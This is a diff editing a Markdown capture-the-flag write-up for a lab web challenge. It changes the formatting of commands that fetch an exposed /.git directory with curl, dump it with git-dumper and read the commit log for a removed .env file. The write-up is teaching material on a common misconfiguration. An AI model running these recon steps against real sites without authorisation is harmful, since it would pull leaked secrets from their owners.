@@ -14,7 +14,7 @@ target: https://dashboard.webverselabs-pro.com/challenges/b-side
 From our briefing, we saw the web designer had accidentally commited the .env file. My first step was to verify this still exists. We can curl the `/.git` endpoint to check -  
 
 ```bash
-curl https://41b6bff9-6940-b-side-4254f.challenges.webverselabs-pro.com/.git/
+$ curl https://41b6bff9-6940-b-side-4254f.challenges.webverselabs-pro.com/.git/
 
 <html>
 <head><title>Index of /.git/</title></head>
@@ -38,7 +38,8 @@ curl https://41b6bff9-6940-b-side-4254f.challenges.webverselabs-pro.com/.git/
 And we have it. Next step is to use a tool like [git-dumper](https://github.com/arthaud/git-dumper) so we can investigate the logs.
 
 ```bash
-python3 gitdumper.py https://41b6bff9-6940-b-side-4254f.challenges.webverselabs-pro.com/ ~/ctf/webverse/lrr                                                                                                                                                                           
+$ python3 gitdumper.py https://41b6bff9-6940-b-side-4254f.challenges.webverselabs-pro.com/ ~/ctf/webverse/lrr
+
 /home/grehaus/venv/lib/python3.13/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.20) or chardet (7.7.0)/charset_normalizer (2.0.12) doesn't match a supported version!
   warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
 [-] Testing https://41b6bff9-6940-b-side-4254f.challenges.webverselabs-pro.com/.git/HEAD [200]
@@ -53,7 +54,7 @@ We now have the git history, we can investigate more.
 ## [02] Investigating git logs
 
 Now we need to navigate to the directory we told git-dumper to store all the logs. We can then run `git log` to see the previous commits - 
-```git
+```bash
 commit 438b795c2f8f930acf2d4e75121fa47249c4e1d7 (HEAD -> main)
 Author: Aphra Vidler <aphra@looproam.records>
 Date:   Mon Feb 12 19:48:00 2024 +0000
@@ -106,7 +107,7 @@ Date:   Mon Feb 5 15:22:00 2024 +0000
 
 There are quite a few here, but commit `77933b93c55f65fd2933833e8e99a5ce6723ed08` stands out. The commit states it removed the .env file and states not to commit secrets. We can view this commit with `git show <commit ID>`.
 
-```git
+```bash
 commit 77933b93c55f65fd2933833e8e99a5ce6723ed08
 Author: Aphra Vidler <aphra@looproam.records>
 Date:   Tue Feb 6 22:41:00 2024 +0000
